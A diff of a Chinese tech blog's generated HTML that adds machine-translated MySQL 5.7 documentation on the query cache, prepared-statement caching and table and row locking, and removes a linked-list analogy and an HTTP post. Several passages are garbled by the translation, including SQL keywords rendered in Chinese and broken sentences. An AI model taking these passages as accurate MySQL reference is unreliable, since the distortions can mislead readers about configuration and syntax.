+<p>如果从查询缓存返回查询结果，则服务器会递增Qcache_hits 状态变量，而不是Com_select。请参见 第8.10.3.4节“查询缓存状态和维护”。</p>
+<p>如果表更改，则使用该表的所有高速缓存查询都将变为无效并从高速缓存中删除。这包括使用MERGE映射到已更改表的表的查询。一个表可以被许多类型的语句，如被改变INSERT， UPDATE， DELETE， TRUNCATE TABLE， ALTER TABLE， DROP TABLE，或 DROP DATABASE。</p>
+<p>使用InnoDB表时，查询缓存也可在事务中使用 。</p>
+<p>SELECT缓存查询对视图 的结果。</p>
+<p>查询缓存适用于SELECT SQL_CALC_FOUND_ROWS …查询并存储由以下SELECT FOUND_ROWS()查询返回的值。 FOUND_ROWS()即使从缓存中提取了前面的查询，也会返回正确的值，因为找到的行数也存储在缓存中。该SELECT FOUND_ROWS()查询本身不能被缓存。</p>
+<p>使用mysql_stmt_prepare()和 使用二进制协议发布的预准备语句mysql_stmt_execute()（请参见 第27.8.8节“C API准备语句”）受限于缓存。与查询缓存中的语句的比较基于扩展?参数标记后的语句文本。该语句仅与使用二进制协议执行的其他缓存语句进行比较。也就是说，对于查询缓存目的，使用二进制协议发出的预准备语句与使用文本协议发布的预准备语句不同（请参见 第13.5节“准备的SQL语句语法”）。</p>
+<p>如果查询使用以下任何功能，则无法缓存该查询：</p>
+<p>AES_DECRYPT()</p>
+<p>AES_ENCRYPT()</p>
+<p>BENCHMARK()</p>
+<p>CONNECTION_ID()</p>
+<p>CONVERT_TZ()</p>
+<p>CURDATE()</p>
+<p>CURRENT_DATE()</p>
+<p>CURRENT_TIME()</p>
+<p>CURRENT_TIMESTAMP()</p>
+<p>CURRENT_USER()</p>
+<p>CURTIME()</p>
+<p>DATABASE()</p>
+<p>ENCRYPT() 有一个参数</p>
+<p>FOUND_ROWS()</p>
+<p>GET_LOCK()</p>
+<p>IS_FREE_LOCK()</p>
+<p>IS_USED_LOCK()</p>
+<p>LAST_INSERT_ID()</p>
+<p>LOAD_FILE()</p>
+<p>MASTER_POS_WAIT()</p>
+<p>NOW()</p>
+<p>PASSWORD()</p>
+<p>RAND()</p>
+<p>RANDOM_BYTES()</p>
+<p>RELEASE_ALL_LOCKS()</p>
+<p>RELEASE_LOCK()</p>
+<p>SLEEP()</p>
+<p>SYSDATE()</p>
+<p>UNIX_TIMESTAMP() 没有参数</p>
+<p>USER()</p>
+<p>UUID()</p>
+<p>UUID_SHORT()</p>
+<p>在这些条件下也不会缓存查询：</p>
+<p>它指的是用户定义的函数（UDF）或存储的函数。</p>
+<p>它指的是用户变量或本地存储的程序变量。</p>
+<p>它是指在表mysql， INFORMATION_SCHEMA或 performance_schema数据库。</p>
+<p>它指的是任何分区表。</p>
+<p>它具有以下任何一种形式：</p>
+<p>选择…锁定共享模式<br>SELECT … FOR UPDATE<br>SELECT … INTO OUTFILE ……<br>SELECT … INTO DUMPFILE …<br>SELECT * FROM … WHERE autoincrement_col为NULL<br>最后一个表单未缓存，因为它用作ODBC解决方法以获取最后一个插入ID值。请参见第27章连接器和API的Connector / ODBC部分 。</p>
+<p>使用SERIALIZABLE隔离级别的事务中的语句 也无法缓存，因为它们使用LOCK IN SHARE MODE锁定。</p>
+<p>它使用TEMPORARY表格。</p>
+<p>它不使用任何表。</p>
+<p>它会生成警告。</p>
+<p>用户对任何涉及的表都具有列级权限。</p>
+<p>8.10.3.2查询缓存SELECT选项<br>注意<br>从MySQL 5.7.20开始，不推荐使用查询缓存，并在MySQL 8.0中删除。</p>
+<p>可以在SELECT语句中指定两个与查询缓存相关的选项 ：</p>
+<p>SQL_CACHE</p>
+<p>如果查询结果是可缓存的，并且query_cache_type系统变量的值为ON或 ，则缓存查询结果 DEMAND。</p>
+<p>SQL_NO_CACHE</p>
+<p>服务器不使用查询缓存。它既不检查查询缓存，也不检查结果是否已缓存，也不缓存查询结果。</p>
+<p>例子：</p>
+<p>SELECT SQL_CACHE id，name FROM customer;<br>SELECT SQL_NO_CACHE id，name FROM customer;<br>8.10.3.3查询缓存配置<br>注意<br>从MySQL 5.7.20开始，不推荐使用查询缓存，并在MySQL 8.0中删除。</p>
+<p>该have_query_cache服务器系统变量指示查询缓存是否可用：</p>
+<p>MySQL的&gt; SHOW VARIABLES LIKE ‘have_query_cache’;</p>
+<ul>
+<li>—————— + ——- +<br>| Variable_name | 值|</li>
+<li>—————— + ——- +<br>| have_query_cache | 是的|</li>
+<li>—————— + ——- +<br>使用标准MySQL二进制文件时YES，即使禁用了查询缓存，此值也始终 如此。</li>
+</ul>
+<p>其他几个系统变量控制查询缓存操作。这些可以在启动mysqld时在选项文件或命令行中设置。查询缓存系统变量都具有以…开头的名称 query_cache_。第5.1.7节“服务器系统变量”中对它们进行了简要介绍 ，并在此处给出了其他配置信息。</p>
+<p>要设置查询缓存的大小，请设置 query_cache_size系统变量。将其设置为0将禁用查询缓存，设置也是如此query_cache_type=0。默认情况下，禁用查询缓存。这是使用默认大小1M实现的，默认 query_cache_type值为0。</p>
+<p>要显着降低开销，请在query_cache_type=0不使用查询缓存的情况下启动服务器 。</p>
+<p>注意<br>使用Windows配置向导安装或配置MySQL时，query_cache_size将根据可用的不同配置类型自动为您配置默认值 。使用Windows配置向导时，由于所选配置，可能会启用查询缓存（即设置为非零值）。查询缓存也由query_cache_type变量的设置控制 。配置完成后，检查my.ini文件中设置的这些变量的值 。</p>
+<p>设置query_cache_size 为非零值时，请记住查询缓存需要最小大小约40KB才能分配其结构。（确切的大小取决于系统架构。）如果将值设置得太小，您将收到警告，如下例所示：</p>
+<p>MySQL的&gt; SET GLOBAL query_cache_size = 40000;<br>查询正常，0行受影响，1警告（0.00秒）</p>
+<p>MySQL的&gt; SHOW WARNINGS\G<br><strong><strong><strong><strong><strong><strong>***</strong></strong></strong></strong></strong></strong> 1. row <strong><strong><strong><strong><em>**</em></strong></strong></strong></strong> <strong>***</strong><br>  等级：警告<br>   代码：1282<br>消息：查询缓存未能设置大小39936;<br>         新查询缓存大小为0</p>
+<p>MySQL的&gt; SET GLOBAL query_cache_size = 41984;<br>查询OK，0行受影响（0.00秒）</p>
+<p>MySQL的&gt; SHOW VARIABLES LIKE ‘query_cache_size’;</p>
+<ul>
+<li>—————— + ——- +<br>| Variable_name | 值|</li>
+<li>—————— + ——- +<br>| query_cache_size | 41984 |</li>
+<li>—————— + ——- +<br>要使查询缓存实际上能够保存任何查询结果，必须将其大小设置得更大：</li>
+</ul>
+<p>MySQL的&gt; SET GLOBAL query_cache_size = 1000000;<br>查询正常，0行受影响（0.04秒）</p>
+<p>MySQL的&gt; SHOW VARIABLES LIKE ‘query_cache_size’;</p>
+<ul>
+<li>—————— + ——– +<br>| Variable_name | 值|</li>
+<li>—————— + ——– +<br>| query_cache_size | 999424 |</li>
+<li>—————— + ——– +<br>一排（0.00秒）<br>该query_cache_size值与最近的1024字节块对齐。因此，报告的值可能与您指定的值不同。</li>
+</ul>
+<p>如果查询缓存大小大于0，则该 query_cache_type变量会影响其工作方式。此变量可以设置为以下值：</p>
+<p>值的 缓存0或OFF阻止缓存或检索缓存结果的值。</p>
+<p>除了以那些开头的语句之外的 值的值1或ON启用缓存 SELECT SQL_NO_CACHE。</p>
+<p>值的值2或 DEMAND导致仅缓存那些以＃开头的语句SELECT SQL_CACHE。</p>
+<p>如果query_cache_size为0，则还应将query_cache_type变量设置 为0.在这种情况下，服务器根本不会获取查询缓存互斥锁，这意味着无法在运行时启用查询缓存，并且减少了查询执行的开销。</p>
+<p>设置该GLOBAL query_cache_type值可确定在进行更改后连接的所有客户端的查询缓存行为。各个客户端可以通过设置SESSION query_cache_type值来控制自己连接的缓存行为 。例如，客户端可以禁用查询缓存的使用，如下所示：</p>
+<p>MySQL的&gt; SET SESSION query_cache_type = OFF;<br>如果设置query_cache_type 为服务器启动（而不是在运行时使用 SET 语句），则只允许使用数值。</p>
+<p>要控制可以缓存的单个查询结果的最大大小，请设置 query_cache_limit系统变量。默认值为1MB。</p>
+<p>注意不要将缓存的大小设置得太大。由于线程需要在更新期间锁定缓存，因此您可能会看到一个非常大的缓存的锁争用问题。</p>
+<p>注意<br>您可以SET 使用 命令行或配置文件中的选项，使用该语句 设置可在运行时为查询缓存指定的最大大小 。 –maximum-query_cache_size=32M</p>
+<p>当要缓存查询时，其结果（发送到客户端的数据）在结果检索期间存储在查询缓存中。因此，数据通常不会在一个大块中处理。查询高速缓存分配用于按需存储该数据的块，因此当填充一个块时，分配新块。由于内存分配操作成本高昂（按时间），查询缓存会分配具有query_cache_min_res_unit 系统变量给定的最小大小的块 。执行查询时，将最后一个结果块修剪为实际数据大小，以释放未使用的内存。根据服务器执行的查询类型，您可能会发现调整以下值的方法很有帮助 query_cache_min_res_unit：</p>
+<p>默认值为 query_cache_min_res_unit 4KB。这应该适用于大多数情况。</p>
+<p>如果您有大量具有较小结果的查询，则默认块大小可能会导致内存碎片，如大量空闲块所示。由于内存不足，碎片可以强制查询缓存从缓存中删除（删除）查询。在这种情况下，减少值 query_cache_min_res_unit。由于修剪而删除的空闲块和查询的数量由Qcache_free_blocks和 Qcache_lowmem_prunes 状态变量的值给出 。</p>
+<p>如果您的大多数查询都有大的结果（检查 Qcache_total_blocks和 Qcache_queries_in_cache 状态变量），您可以通过增加来提高性能 query_cache_min_res_unit。但是，请注意不要太大（请参阅上一项）。</p>
+<p>8.10.3.4查询缓存状态和维护<br>注意<br>从MySQL 5.7.20开始，不推荐使用查询缓存，并在MySQL 8.0中删除。</p>
+<p>要检查MySQL服务器中是否存在查询缓存，请使用以下语句：</p>
+<p>MySQL的&gt; SHOW VARIABLES LIKE ‘have_query_cache’;</p>
+<ul>
+<li>—————— + ——- +<br>| Variable_name | 值|</li>
+<li>—————— + ——- +<br>| have_query_cache | 是的|</li>
+<li>—————— + ——- +<br>您可以对查询缓存进行碎片整理，以便通过FLUSH QUERY CACHE语句更好地利用其内存。该语句不会从缓存中删除任何查询。</li>
+</ul>
+<p>该RESET QUERY CACHE语句从查询缓存中删除所有查询结果。该 FLUSH TABLES声明也做到这一点。</p>
+<p>要监视查询缓存性能，请使用 SHOW STATUS查看缓存状态变量：</p>
+<p>MySQL的&gt; SHOW STATUS LIKE ‘Qcache%’;</p>
+<ul>
+<li>————————- + ——– +<br>| Variable_name | 值|</li>
+<li>————————- + ——– +<br>| Qcache_free_blocks | 36 |<br>| Qcache_free_memory | 138488 |<br>| Qcache_hits | 79570 |<br>| Qcache_inserts | 27087 |<br>| Qcache_lowmem_prunes | 3114 |<br>| Qcache_not_cached | 22989 |<br>| Qcache_queries_in_cache | 415 |<br>| Qcache_total_blocks | 912 |</li>
+<li>————————- + ——– +<br>第5.1.9节“服务器状态变量” 中给出了每个变量的描述 。这里描述了它们的一些用途。</li>
+</ul>
+<p>SELECT 查询 总数由以下公式给出：</p>
+<p>  Com_select</p>
+<ul>
+<li><p>Qcache_hits<br>+解析器发现错误的查询<br>该Com_select值由以下公式给出：</p>
+<p>Qcache_inserts</p>
+</li>
+<li>Qcache_not_cached<br>+在列权限检查期间发现错误的查询<br>查询缓存使用可变长度的块，所以 Qcache_total_blocks与 Qcache_free_blocks可指示查询高速缓冲存储器碎片。之后 FLUSH QUERY CACHE，只剩下一个空闲区块。</li>
+</ul>
+<p>每个缓存的查询至少需要两个块（一个用于查询文本，一个或多个用于查询结果）。此外，查询使用的每个表都需要一个块。但是，如果两个或多个查询使用同一个表，则只需要分配一个表块。</p>
+<p>Qcache_lowmem_prunes状态变量 提供的信息 可以帮助您调整查询缓存大小。它计算已从缓存中删除的查询数，以释放内存以缓存新查询。查询缓存使用最近最少使用（LRU）策略来决定从缓存中删除哪些查询。调整信息在 第8.10.3.3节“查询高速缓存配置”中给出。</p>
+<p>8.10.4准备好的语句和存储程序的缓存<br>对于客户端可能在会话期间多次执行的某些语句，服务器会将语句转换为内部结构并缓存要在执行期间使用的结构。缓存使服务器能够更有效地执行，因为它避免了在会话期间再次需要时重新转换语句的开销。这些语句发生转换和缓存：</p>
+<p>准备好的语句，包括在SQL级别（使用PREPARE语句）处理的语句和使用二进制客户端/服务器协议（使用mysql_stmt_prepare()C API函数）处理的语句 。所述 max_prepared_stmt_count 系统变量控制语句的服务器高速缓存的总数量。（所有会话中准备好的语句总数。）</p>
+<p>存储的程序（存储过程和函数，触发器和事件）。在这种情况下，服务器转换并缓存整个程序体。该 stored_program_cache系统变量指示存储的程序每个会话的服务器缓存的大致数量。</p>
+<p>服务器基于每个会话维护预准备语句和存储程序的高速缓存。其他会话无法访问为一个会话缓存的语句。会话结束时，服务器会丢弃为其缓存的任何语句。</p>
+<p>当服务器使用缓存的内部语句结构时，必须注意结构不会过时。对于语句使用的对象，可能会发生元数据更改，从而导致当前对象定义与内部语句结构中表示的定义不匹配。DDL语句（例如创建，删除，更改，重命名或截断表，或分析，优化或修复表）的元数据发生更改。表内容更改（例如，使用INSERT或 UPDATE）不更改元数据，也不更改SELECT语句。</p>
+<p>以下是问题的说明。假设客户准备此声明：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">从&apos;SELECT * FROM t1&apos;预备s1;</span><br><span class="line">将SELECT *内部结构扩展为表中列的列表。如果修改了表中的列集，则ALTER TABLE预准备语句将过期。如果服务器在下次客户端执行时未检测到此更改s1，则预准备语句将返回不正确的结果。</span><br><span class="line"></span><br><span class="line">为了避免由预准备语句引用的表或视图的元数据更改导致的问题，服务器会检测这些更改并在下次执行时自动重新表示该语句。也就是说，服务器重新声明语句并重建内部结构。在从表定义高速缓存中刷新引用的表或视图之后，也会发生重新分析，或者隐式地为缓存中的新条目腾出空间，或者显式由于FLUSH TABLES。</span><br><span class="line"></span><br><span class="line">同样，如果存储程序使用的对象发生更改，则服务器会重新编译程序中受影响的语句。</span><br><span class="line"></span><br><span class="line">服务器还检测表达式中对象的元数据更改。这些可能会在特定的存储方案，如语句中使用DECLARE CURSOR或流量控制语句，如 IF， CASE和 RETURN。</span><br><span class="line"></span><br><span class="line">为避免重新解析整个存储的程序，服务器仅在需要时重新编译程序中受影响的语句或表达式。例子：</span><br><span class="line"></span><br><span class="line">假设更改了表或视图的元数据。重新解析为一个发生SELECT *访问的表或视图的程序中，但不是一个 SELECT *不访问该表或视图。</span><br><span class="line"></span><br><span class="line">当语句受到影响时，如果可能，服务器仅对其进行部分重新分析。请考虑以下 CASE声明：</span><br><span class="line"></span><br><span class="line">情况case_expr</span><br><span class="line">  什么时候when_expr1......</span><br><span class="line">  什么时候when_expr2......</span><br><span class="line">  什么时候when_expr3......</span><br><span class="line">  ...</span><br><span class="line">结束案例</span><br><span class="line">如果元数据更改仅影响，则会重新解析该表达式。 并且其他表达式没有被重新解析。 WHEN when_expr3case_exprWHEN</span><br><span class="line"></span><br><span class="line">重新分析使用对原始转换为内部表单有效的默认数据库和SQL模式。</span><br><span class="line"></span><br><span class="line">服务器尝试最多重新解析三次。如果所有尝试都失败，则会发生错误</span><br><span class="line"></span><br><span class="line">重新分析是自动的，但在发生这种情况时，会减少准备好的语句和存储的程序性能。</span><br><span class="line"></span><br><span class="line">对于预处理语句， Com_stmt_reprepare 状态变量跟踪重新表示的数量。</span><br></pre></td></tr></table></figure>
 
-3、关于链表 链表有三个元素【上一个节点位置、下一个节点位置、本节点存数据】
-
-    清晰明了的现实对照物-----还是举例菜园子吧
-
-    菜园子分块种着不同的蔬菜、茄子、土豆、冬瓜、南瓜、北瓜、依次种植
-    那么我们从进出来看、对于人的认知、
-    茄子右边是土豆
-    土豆左边是茄子、右边是南瓜
-    ...一次类推
-    我们想摘个北瓜吃、就去菜园子里找北瓜的那一块、
-    我们可以从左往右找，也可从右往左找
-    这个找的过程就是【链表查找】 【单向链表、双向列表】
-    有人将我一眼就看到了那块是北瓜地、你忽略了你大脑为了处理你看到的视觉信息处理的过程
-</code></pre>
           
         
       
@@ -1628,35 +1864,35 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/jdk/jdk-map/" rel="bookmark">集合Map</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-thread/" rel="bookmark">SQL优化【线程信息检查】</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2019/05/26/jdk/jdk-model/" rel="bookmark">jdk内存模型</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-sentence/" rel="bookmark">SQL优化【SQL语句】</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/12/11/jdk/jdk-nio/" rel="bookmark">Java NIO浅析【转】</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-total/" rel="bookmark">SQL优化【总方向】</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/11/01/jdk/jdk-tree/" rel="bookmark">java 红黑树</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-data-structure/" rel="bookmark">SQL优化【数据结构】</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/jdk/jdk-annotation/" rel="bookmark">自定义注解</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-lock/" rel="bookmark">SQL优化【锁优化】</a></div>
       
     </li>
   
@@ -1713,7 +1949,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/agreement/http/">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/mysql/optimization-sql-lock/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="上善若水">
@@ -1733,7 +1969,7 @@
           <h2 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2018/03/24/agreement/http/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/18/index.html">http协议</a>
+                <a href="/2018/03/24/mysql/optimization-sql-lock/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/18/index.html">SQL优化【锁优化】</a>
               
             
           </h2>
@@ -1783,7 +2019,7 @@
                   ，
                 
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/agreement/" itemprop="url" rel="index"><span itemprop="name">agreement</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/mysql/" itemprop="url" rel="index"><span itemprop="name">mysql</span></a></span>
 
                 
                 
@@ -1819,13 +2055,16 @@
       
         
           
-            <p>http协议<br><img src="http://upload-images.jianshu.io/upload_images/6434888-2a523de3228d986b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="发展年历"></p>
+            <p><img src="https://upload-images.jianshu.io/upload_images/6434888-b679147e38a9e162.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>MySQL使用锁管理对表内容的争用 ：</p>
+<p>内部锁定在MySQL服务器内部执行，以管理多个线程对表内容的争用。<br>这种类型的锁定是内部的，因为它完全由服务器执行，并且不涉及其他程序。<br>参见 第8.11.1节“内部锁定方法”。</p>
+<p>当服务器和其他程序锁定MyISAM表文件以相互协调哪个程序可以访问表时，发生外部锁定。<br>参见第8.11.5节“外部锁定”。</p>
+<p>8.11.1内部锁定方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">本节讨论内部锁定; 即在MySQL服务器本身内执行锁定以管理多个会话对表内容的争用。</span><br><span class="line">这种类型的锁定是内部的，因为它完全由服务器执行，并且不涉及其他程序。</span><br><span class="line">对于其他程序在MySQL文件上执行的锁定，请参见第8.11.5节“外部锁定”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">行级锁定</span><br><span class="line"></span><br><span class="line">表级锁定</span><br><span class="line"></span><br><span class="line">选择锁定类型</span><br><span class="line"></span><br><span class="line">行级锁定</span><br><span class="line">MySQL使用行级锁定为InnoDB表，以支持由多个会话并发写入权限，使其适用于多用户，高并发，和OLTP应用程序。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">为了避免在单个表上执行多个并发写入操作时发生死锁， InnoDB通过SELECT ... FOR UPDATE为每组预计要修改的行发布语句，即使数据更改语句稍后在事务中发生，也可以在事务启动时获取必要的锁。</span><br><span class="line">如果交易修改或锁定多个表，请在每个交易中以相同的顺序发布适用的报表。</span><br><span class="line">死锁会影响性能而不是表示严重的错误，因为它会 InnoDB自动 检测 死锁条件并回滚其中一个受影响的事务。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在高并发系统上，当大量线程等待相同的锁时，死锁检测会导致速度下降。</span><br><span class="line">有时候，innodb_lock_wait_timeout 当死锁发生时，禁用死锁检测并依赖事务回滚的设置可能更有效 。</span><br><span class="line">使用innodb_deadlock_detect 配置选项可以禁用死锁检测 。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">行级锁定的优点：</span><br><span class="line"></span><br><span class="line">当不同的会话访问不同的行时，更少的锁冲突。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">回滚更少。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可能长时间锁定一行。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">表级锁定</span><br><span class="line">MySQL使用表级锁的MyISAM， MEMORY和MERGE 表，只允许一个会话更新一次这些表。</span><br><span class="line">这种锁定级别使得这些存储引擎更适合于只读，主要读取或单用户应用程序。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这些存储引擎通过始终在查询开始时一次请求所有需要的锁，并始终以相同的顺序锁定表来避免 死锁。</span><br><span class="line">权衡是这种策略降低了并发性; 其他要修改表的会话必须等到当前数据更改语句结束。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">表级锁定的优点：</span><br><span class="line"></span><br><span class="line">所需的内存相对较少（行锁定需要锁定每行或一组行的内存）</span><br><span class="line"></span><br><span class="line">在大部分表格上使用时都很快，因为只涉及一个锁。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果您经常GROUP BY 对大部分数据执行操作，或者必须频繁扫描整个表，则速度很快。</span><br></pre></td></tr></table></figure></p>
 <p>{———-}</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/6434888-cdf479dfba52d38b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="97年协定1.1"></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/6434888-fdc25911c760f33f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="http数据流向图"></p>
-<p>HTTP　定义了　消息发送流程与信息格式</p>
-<p>发送端<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、请求行</span><br><span class="line">2、请求头</span><br><span class="line">3、请求体</span><br></pre></td></tr></table></figure></p>
-<p>接受端<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、响应行</span><br><span class="line">2、响应头</span><br><span class="line">3、响应体</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">MySQL授予表写入锁定如下：</span><br><span class="line"></span><br><span class="line">如果表上没有锁，请在其上写入锁。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">否则，将锁定请求放入写入锁定队列中。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MySQL授予表读取锁定如下：</span><br><span class="line"></span><br><span class="line">如果表上没有写入锁，请在其上放置一个读取锁。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">否则，将锁定请求放入读锁定队列中。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">表格更新优先于表格检索。</span><br><span class="line">因此，当释放一个锁时，该锁可用于写入锁定队列中的请求，然后可用于读取锁定队列中的请求。</span><br><span class="line">这确保了即使桌子上有大量活动时，表格的更新也不会“ 饿死 ”SELECT。</span><br><span class="line">但是，如果有多个表的更新，则 SELECT语句会等待，直到没有更新。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">有关更改读取和写入优先级的信息，请参见第8.11.2节“表锁定问题”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">您可以通过检查Table_locks_immediate和 Table_locks_waited状态变量来分析系统上的表锁争用 ，这些变量分别表示可以立即授予表锁请求的次数和需要等待的数量：</span><br><span class="line"></span><br><span class="line">MySQL的&gt; SHOW STATUS LIKE &apos;Table%&apos;;</span><br><span class="line">+ ----------------------- + --------- +</span><br><span class="line">| 变量名| 值|</span><br><span class="line">+ ----------------------- + --------- +</span><br><span class="line">| Table_locks_immediate | 1151552 |</span><br><span class="line">| Table_locks_waited | 15324 |</span><br><span class="line">+ ----------------------- + --------- +</span><br><span class="line">性能模式锁定表还提供锁定信息。</span><br><span class="line">请参见 第25.11.12节“性能架构锁表”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">该MyISAM存储引擎支持并发插入，减少读者和作者之间的竞争给定表：如果一个MyISAM 表有数据文件的中间没有空闲块，行总是在数据文件的末尾插入。</span><br><span class="line">在这种情况下，您可以自由地将一个表的并发INSERT和SELECT语句 混合使用 ， MyISAM而无需锁定。</span><br><span class="line">也就是说，你可以插入行到一个MyISAM表同时其他客户正在阅读它。</span><br><span class="line">在表中间删除或更新的行可能会产生空洞。</span><br><span class="line">如果存在孔，则同时插入将被禁用，但当所有孔已填充新数据时将自动再次启用插入。</span><br><span class="line">要控制此行为，请使用 concurrent_insert系统变量。</span><br><span class="line">请参见第8.11.3节“并发插入”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果您显式获取表锁 LOCK TABLES，您可以请求 READ LOCAL锁而不是 READ锁，以使其他会话在表锁定的情况下执行并发插入。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">执行许多INSERT和 SELECT操作上的表 t1时并发的插入是不可能的，你可以插入行到一个临时表 